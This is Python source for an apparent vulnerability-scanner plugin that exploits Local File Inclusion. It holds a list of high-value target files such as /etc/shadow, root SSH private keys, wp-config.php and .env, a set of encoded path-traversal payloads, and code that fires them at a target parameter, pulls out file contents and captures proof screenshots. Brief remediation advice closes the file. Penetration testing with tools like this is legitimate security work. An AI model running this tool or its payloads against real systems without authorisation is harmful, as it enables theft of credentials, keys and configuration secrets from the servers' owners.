"""
LFI (Local File Inclusion) Exploit Plugin

This plugin provides exploit capabilities for LFI vulnerabilities including:
- File extraction via path traversal
- Log file reading
- Configuration file access
- Source code disclosure
- Visual proof of exploitation with screenshots
"""

import sys
import os
import re
from typing import Dict, List, Any, Optional
import logging

# Add parent directory to path for imports
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from scanner.plugins.exploit_plugin import ExploitPlugin
from scanner.plugins.payload_generator import get_payload_generator
from scanner.plugins.adaptive_exploit_mixin import AdaptiveExploitMixin
from scanner.plugins.payload_mutator import PayloadMutator

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False
    logging.warning("Requests library not available")

try:
    from scanner.visual_proof_capture import VisualProofCapture
    from scanner.media_manager import MediaManager
    HAS_VISUAL_PROOF = True
except ImportError:
    HAS_VISUAL_PROOF = False
    logging.warning("Visual proof modules not available")

logger = logging.getLogger(__name__)


class LFIPlugin(ExploitPlugin, AdaptiveExploitMixin):
    """
    LFI exploit plugin.
    
    This plugin provides LFI exploitation capabilities including:
    - File extraction via path traversal
    - Sensitive file reading
    - Configuration file disclosure
    - Log file access
    """
    
    # High-value files to extract (expanded list)
    SENSITIVE_FILES = {
        'linux': [
            '/etc/passwd',
            '/etc/shadow',
            '/etc/group',
            '/etc/hosts',
            '/etc/hostname',
            '/etc/issue',
            '/etc/os-release',
            '/etc/mysql/my.cnf',
            '/etc/apache2/apache2.conf',
            '/etc/apache2/sites-enabled/000-default.conf',
            '/etc/nginx/nginx.conf',
            '/etc/nginx/sites-enabled/default',
            '/etc/httpd/conf/httpd.conf',
            '/var/www/html/.htaccess',
            '/var/www/html/config.php',
            '/var/www/html/configuration.php',
            '/var/www/html/wp-config.php',
            '/var/www/html/settings.php',
            '/var/www/html/.env',
            '/home/.bash_history',
            '/root/.bash_history',
            '/root/.ssh/id_rsa',
            '/root/.ssh/authorized_keys',
            '/home/*/.ssh/id_rsa',
            '/proc/self/environ',
            '/proc/self/cmdline',
            '/proc/version',
            '/proc/cmdline',
            '/proc/net/tcp',
            '/proc/net/udp',
            '/proc/net/arp',
            '/var/log/apache2/access.log',
            '/var/log/apache2/error.log',
            '/var/log/nginx/access.log',
            '/var/log/nginx/error.log',
            '/var/log/auth.log',
            '/var/log/syslog',
            '/usr/local/apache/conf/httpd.conf',
            '/usr/local/etc/apache/httpd.conf',
            '/opt/lampp/etc/httpd.conf',
        ],
        'windows': [
            'C:\\Windows\\System32\\drivers\\etc\\hosts',
            'C:\\Windows\\win.ini',
            'C:\\boot.ini',
            'C:\\Windows\\System.ini',
            'C:\\Windows\\php.ini',
            'C:\\xampp\\apache\\conf\\httpd.conf',
            'C:\\xampp\\php\\php.ini',
            'C:\\xampp\\mysql\\bin\\my.ini',
            'C:\\Program Files\\Apache\\conf\\httpd.conf',
            'C:\\Program Files\\Apache Group\\Apache\\conf\\httpd.conf',
            'C:\\Program Files\\Apache Group\\Apache2\\conf\\httpd.conf',
            'C:\\Windows\\System32\\inetsrv\\config\\applicationHost.config',
            'C:\\inetpub\\wwwroot\\web.config',
            'C:\\inetpub\\logs\\LogFiles\\W3SVC1\\',
            'C:\\Windows\\Panther\\Unattend.xml',
            'C:\\Windows\\Panther\\Unattended.xml',
        ]
    }
    
    # Path traversal techniques (expanded with encoding variations)
    TRAVERSAL_PAYLOADS = [
        '{file}',
        '../{file}',
        '../../{file}',
        '../../../{file}',
        '../../../../{file}',
        '../../../../../{file}',
        '../../../../../../{file}',
        '../../../../../../../{file}',
        '../../../../../../../../{file}',
        '../../../../../../../../../{file}',
        '..\\{file}',
        '..\\..\\{file}',
        '..\\..\\..\\{file}',
        '..\\..\\..\\..\\{file}',
        '....//....//....//....//....//....//....//....{file}',
        '....\\\\....\\\\....\\\\....\\\\{file}',
        '..%2f..%2f..%2f..%2f..%2f..%2f{file}',
        '..%5c..%5c..%5c..%5c..%5c..%5c{file}',
        '..%252f..%252f..%252f..%252f..%252f{file}',
        '..%255c..%255c..%255c..%255c..%255c{file}',
        '%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{file}',
        '%2e%2e\\%2e%2e\\%2e%2e\\%2e%2e\\%2e%2e\\{file}',
        '..;/{file}',
        '../;/{file}',
        '..%00/{file}',
        '..%0d%0a/{file}',
    ]
    
    @property
    def vulnerability_type(self) -> str:
        """Return the vulnerability type identifier."""
        return 'lfi'
    
    @property
    def name(self) -> str:
        """Return the plugin name."""
        return 'LFI Exploit'
    
    @property
    def description(self) -> str:
        """Return the plugin description."""
        return (
            'Local File Inclusion exploit plugin for extracting local files '
            'via path traversal and file inclusion vulnerabilities.'
        )
    
    @property
    def version(self) -> str:
        """Return the plugin version."""
        return '2.1.0'
    
    def generate_payloads(self, context: Optional[Dict[str, Any]] = None) -> List[str]:
        """
        Generate LFI payloads based on context with mutations.
        
        Args:
            context: Optional context containing:
                    - target_file: File to include (e.g., /etc/passwd)
                    - target_os: Target operating system (linux, windows)
                    - encoding: Encoding to use (url, double_url, etc.)
                    - use_mutations: Whether to apply payload mutations (default: True)
        
        Returns:
            List of LFI payload strings
        """
        context = context or {}
        target_file = context.get('target_file', '/etc/passwd')
        target_os = context.get('target_os', 'linux')
        use_mutations = context.get('use_mutations', True)
        
        payloads = []
        
        # Strip leading slash for traversal payloads (only first one if present)
        file_path = target_file[1:] if target_file.startswith('/') else target_file
        file_path = file_path[1:] if file_path.startswith('\\') else file_path
        
        # Generate payloads with different traversal depths - try ALL payloads now
        for payload_template in self.TRAVERSAL_PAYLOADS:
            payload = payload_template.format(file=file_path)
            payloads.append(payload)
        
        # Apply mutations if enabled
        if use_mutations:
            payloads = PayloadMutator.mutate_payload_list(
                payloads,
                mutation_types=['encoding']
            )
        
        return payloads
    
    def execute_attack(self, target_url: str, vulnerability_data: Dict[str, Any],
                      config: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        """
        Execute LFI exploit attack.
        
        Args:
            target_url: The target URL to attack
            vulnerability_data: Dictionary containing vulnerability information:
                              - parameter: Vulnerable parameter name
                              - method: HTTP method (GET, POST, etc.)
            config: Optional configuration dictionary
        
        Returns:
            Dict containing:
                - success: Boolean indicating if attack succeeded
                - extracted_files: Dict of successfully extracted files
                - evidence: Evidence of successful exploitation
                - successful_payloads: List of payloads that succeeded
                - repeater_requests: Request/response data for manual testing
                - error: Error message if attack failed
        """
        if not HAS_REQUESTS:
            return {
                'success': False,
                'error': 'Requests library not available',
                'vulnerability_type': 'lfi',
            }
        
        config = config or {}
        parameter = vulnerability_data.get('parameter')
        method = vulnerability_data.get('method', 'GET').upper()
        
        if not parameter:
            return {
                'success': False,
                'error': 'No vulnerable parameter specified',
                'vulnerability_type': 'lfi',
            }
        
        logger.info(f"Attempting LFI exploitation on {target_url}, parameter: {parameter}")
        
        # Try to extract sensitive files
        exploitation_result = self._attempt_file_extraction(
            target_url, parameter, method, config
        )
        
        if exploitation_result['success']:
            logger.info(f"Successfully exploited LFI on {target_url}")
            
            # Build repeater requests for each successfully extracted file
            repeater_requests = []
            successful_payloads = exploitation_result.get('successful_payloads', [])
            extracted_files = exploitation_result.get('files', {})
            
            for file_path, content in list(extracted_files.items())[:5]:  # Limit to 5 examples
                # Find the payload that extracted this file
                payload_info = exploitation_result.get('payload_map', {}).get(file_path, {})
                payload = payload_info.get('payload', file_path)
                
                repeater_req = self.format_repeater_request(
                    url=target_url,
                    method=method,
                    headers={'User-Agent': 'Megido Scanner'},
                    body=f"{parameter}={payload}" if method == 'POST' else '',
                    description=f"LFI extraction of {file_path}"
                )
                
                # Add response data showing extracted content
                repeater_req['response'] = {
                    'body': content[:1000],  # First 1000 chars
                    'evidence': f'Successfully extracted file: {file_path}'
                }
                
                repeater_requests.append(repeater_req)
            
            result = {
                'success': True,
                'extracted_files': extracted_files,
                'evidence': exploitation_result.get('evidence', ''),
                'vulnerability_type': 'lfi',
                'message': f'Successfully extracted {len(extracted_files)} file(s)',
                'successful_payloads': successful_payloads,
                'repeater_requests': repeater_requests,
            }
            
            # Capture visual proof if available
            if HAS_VISUAL_PROOF and config.get('capture_visual_proof', True):
                visual_proofs = self._capture_visual_proof(target_url, parameter, exploitation_result, config)
                if visual_proofs:
                    result['visual_proofs'] = visual_proofs
                    logger.info(f"Captured {len(visual_proofs)} visual proof(s)")
            
            return result
        else:
            logger.info(f"LFI exploitation attempt failed on {target_url}")
            return {
                'success': False,
                'error': exploitation_result.get('error', 'Could not extract files'),
                'message': 'LFI exploitation attempt was unsuccessful',
                'vulnerability_type': 'lfi',
            }
    
    def _attempt_file_extraction(self, url: str, parameter: str, method: str,
                                 config: Dict[str, Any]) -> Dict[str, Any]:
        """
        Attempt to extract files via LFI.
        
        Returns:
            Dict with success status, extracted files, and payload tracking
        """
        verify_ssl = config.get('verify_ssl', False)
        timeout = config.get('timeout', 10)
        extracted_files = {}
        successful_payloads = []
        payload_map = {}  # Maps file path to payload info
        
        # Try ALL Linux files (expanded coverage)
        logger.info("Attempting to extract Linux files...")
        for target_file in self.SENSITIVE_FILES['linux']:  # Try ALL
            result = self._try_extract_file(
                url, parameter, method, target_file, verify_ssl, timeout, config
            )
            if result['success']:
                extracted_files[target_file] = result['content']
                payload = result.get('payload', target_file)
                successful_payloads.append(payload)
                payload_map[target_file] = {'payload': payload, 'method': method}
                logger.info(f"Successfully extracted: {target_file}")
        
        # Try ALL Windows files (expanded coverage)
        logger.info("Attempting to extract Windows files...")
        for target_file in self.SENSITIVE_FILES['windows']:  # Try ALL
            result = self._try_extract_file(
                url, parameter, method, target_file, verify_ssl, timeout, config
            )
            if result['success']:
                extracted_files[target_file] = result['content']
                payload = result.get('payload', target_file)
                successful_payloads.append(payload)
                payload_map[target_file] = {'payload': payload, 'method': method}
                logger.info(f"Successfully extracted: {target_file}")
        
        if extracted_files:
            result = {
                'success': True,
                'files': extracted_files,
                'evidence': f'Extracted {len(extracted_files)} file(s): {", ".join(extracted_files.keys())}',
                'successful_payloads': successful_payloads,
                'payload_map': payload_map
            }
            
            # Generate unified proof report
            if config.get('enable_proof_reporting', True):
                from scanner.proof_reporting_helpers import add_proof_reporting_to_result
                result['extracted_data'] = extracted_files
                add_proof_reporting_to_result(
                    self, 'lfi', result, url,
                    vulnerability_data, config
                )
            
            return result
        else:
            return {
                'success': False,
                'error': 'Could not extract any files'
            }
    
    def _try_extract_file(self, url: str, parameter: str, method: str,
                         target_file: str, verify_ssl: bool, timeout: int,
                         config: Dict[str, Any]) -> Dict[str, Any]:
        """
        Try to extract a specific file using various traversal techniques.
        
        Returns:
            Dict with success status and file content
        """
        # Strip leading slash for traversal (only first one if present)
        file_path = target_file[1:] if target_file.startswith('/') else target_file
        file_path = file_path[1:] if file_path.startswith('\\') else file_path
        
        # Use adaptive multi-method approach with ALL traversal techniques
        def verify_func(response):
            return self._verify_file_content(response.text, target_file)
        
        # Generate payloads using traversal variations
        payloads = [template.format(file=file_path) for template in self.TRAVERSAL_PAYLOADS]
        
        # Try with adaptive request handling
        for payload in payloads:
            result = self._try_multiple_methods(
                url, payload, parameter, config, verify_func
            )
            
            if result.get('success') and result.get('response'):
                return {
                    'success': True,
                    'content': result['response'].text[:1000],  # First 1000 chars
                    'payload': payload,
                }
        
        return {
            'success': False,
            'error': f'Could not extract {target_file}'
        }
    
    def _verify_file_content(self, content: str, target_file: str) -> bool:
        """Verify if the content contains expected file signatures."""
        # passwd file
        if 'passwd' in target_file:
            return bool(re.search(r'root:.*:0:0', content) or 
                       re.search(r'daemon:.*:', content))
        
        # hosts file
        if 'hosts' in target_file:
            return bool(re.search(r'127\.0\.0\.1', content) or
                       'localhost' in content)
        
        # win.ini
        if 'win.ini' in target_file:
            return '[fonts]' in content or '[extensions]' in content
        
        # Apache/Nginx config
        if 'apache' in target_file or 'nginx' in target_file or 'httpd.conf' in target_file:
            return 'ServerRoot' in content or 'DocumentRoot' in content or 'server {' in content
        
        # MySQL config
        if 'my.cnf' in target_file:
            return '[mysqld]' in content or '[client]' in content
        
        # PHP config
        if 'config.php' in target_file or 'wp-config.php' in target_file:
            return '<?php' in content or 'DB_NAME' in content or 'DB_PASSWORD' in content
        
        # /proc files
        if '/proc/' in target_file:
            return len(content) > 0 and len(content) < 10000  # Reasonable size
        
        # Generic check - if response is not HTML and has reasonable length
        if '<html' not in content.lower() and len(content) > 10:
            return True
        
        return False
    
    def get_severity_level(self) -> str:
        """Return the typical severity level for LFI vulnerabilities."""
        return 'high'
    
    def _capture_visual_proof(self, url: str, parameter: str, 
                               exploitation_result: Dict[str, Any],
                               config: Dict[str, Any]) -> List[Dict[str, Any]]:
        """
        Capture visual proof of LFI exploitation.
        
        Args:
            url: Target URL
            parameter: Vulnerable parameter
            exploitation_result: Results from exploitation attempt
            config: Configuration dictionary
            
        Returns:
            List of visual proof metadata dictionaries
        """
        visual_proofs = []
        
        try:
            proof_capture = VisualProofCapture()
            extracted_files = exploitation_result.get('files', {})
            
            # Capture screenshot of successful file extraction
            if extracted_files:
                # Build URL with successful payload for first extracted file
                first_file = list(extracted_files.keys())[0]
                file_path = first_file[1:] if first_file.startswith('/') else first_file
                
                # Try a few traversal depths
                for depth in range(3, 6):
                    payload = '../' * depth + file_path
                    
                    # Capture screenshot
                    screenshot_data = proof_capture.capture_screenshot(
                        f"{url}?{parameter}={payload}",
                        wait_time=1.0
                    )
                    
                    if screenshot_data:
                        visual_proofs.append({
                            'type': 'screenshot',
                            'data': screenshot_data,
                            'title': f'LFI - Extracted {first_file}',
                            'description': f'Successfully read file {first_file} using path traversal',
                            'exploit_step': f'File extraction with payload: {payload}',
                            'payload': payload
                        })
                        break
            
        except Exception as e:
            logger.error(f"Failed to capture visual proof: {e}")
        
        return visual_proofs
    
    def verify(self, result: Dict[str, Any], 
               target_url: str,
               vulnerability_data: Dict[str, Any]) -> tuple:
        """
        Verify LFI exploitation with concrete proof of file content disclosure.
        
        Only mark as verified if actual file content was successfully read.
        
        Args:
            result: The result from execute_attack()
            target_url: The target URL
            vulnerability_data: Vulnerability data
            
        Returns:
            Tuple[bool, str]: (is_verified, proof_of_impact)
        """
        if not result.get('success'):
            return False, None
        
        files_read = result.get('files_read', {})
        evidence = result.get('evidence', '')
        
        # Must have actual file content to verify
        if not files_read or len(files_read) == 0:
            return False, None
        
        # Check that we actually got file content
        verified_files = []
        for file_path, content in files_read.items():
            if content and len(content) > 10:
                # Check for known file patterns
                is_valid_file = False
                
                # /etc/passwd patterns
                if 'passwd' in file_path.lower() and 'root:' in content:
                    is_valid_file = True
                
                # /etc/shadow patterns
                elif 'shadow' in file_path.lower() and '$' in content:
                    is_valid_file = True
                
                # Config files
                elif any(ext in file_path.lower() for ext in ['.conf', '.ini', '.cfg', '.xml', '.json']):
                    is_valid_file = True
                
                # Source code files
                elif any(ext in file_path.lower() for ext in ['.php', '.py', '.jsp', '.asp']):
                    is_valid_file = True
                
                # Log files
                elif 'log' in file_path.lower():
                    is_valid_file = True
                
                if is_valid_file:
                    verified_files.append((file_path, content))
        
        if verified_files:
            proof_lines = [
                "✓ VERIFIED - Local File Inclusion (LFI)",
                "",
                f"Successfully read {len(verified_files)} file(s):",
                ""
            ]
            
            for file_path, content in verified_files[:3]:  # Show max 3 files
                proof_lines.append(f"File: {file_path}")
                proof_lines.append("Content Preview:")
                proof_lines.append("─" * 60)
                
                # Show first few lines of content
                content_lines = content.split('\n')[:10]
                for line in content_lines:
                    # Truncate long lines and sanitize
                    if len(line) > 100:
                        line = line[:97] + '...'
                    proof_lines.append(f"  {line}")
                
                if len(content.split('\n')) > 10:
                    proof_lines.append(f"  ... ({len(content.split('\n')) - 10} more lines)")
                
                proof_lines.append("─" * 60)
                proof_lines.append("")
            
            if len(verified_files) > 3:
                proof_lines.append(f"... and {len(verified_files) - 3} more file(s)")
                proof_lines.append("")
            
            proof_lines.append("Impact: Arbitrary file read access on target system")
            
            return True, '\n'.join(proof_lines)
        
        # Files claimed but no valid content
        return False, None
    
    def get_remediation_advice(self) -> str:
        """Return remediation advice for LFI vulnerabilities."""
        return (
            'Prevent LFI attacks:\n'
            '1. Never use user input directly in file paths\n'
            '2. Use whitelists for allowed files or indirect references (IDs)\n'
            '3. Implement strict input validation and sanitization\n'
            '4. Use absolute paths and avoid path concatenation\n'
            '5. Disable allow_url_include in PHP\n'
            '6. Use chroot jails or similar isolation\n'
            '7. Apply principle of least privilege to file permissions\n'
            '8. Remove null byte handling vulnerabilities\n'
            '9. Implement Web Application Firewall (WAF) rules\n'
            '10. Regularly audit file access patterns'
        )
